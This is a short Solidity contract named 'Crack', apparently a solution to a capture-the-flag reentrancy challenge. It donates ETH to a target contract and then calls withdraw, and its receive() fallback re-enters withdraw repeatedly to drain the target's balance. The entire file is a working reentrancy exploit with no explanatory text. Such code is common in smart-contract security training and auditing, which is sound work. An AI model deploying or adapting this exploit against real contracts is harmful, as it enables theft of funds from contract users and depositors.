pragma solidity ^0.6.0;

interface Target {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract Crack {
    Target target;

    constructor(address payable _target) public payable {
        require(msg.value > 0, "send me some eth");
        target = Target(_target);
        target.donate{value: msg.value}(address(this));
    }

    function crack() external {
        target.withdraw(target.balanceOf(address(this)));
    }

    receive() external payable {
        target.withdraw(
            target.balanceOf(address(this))
        );
    }
}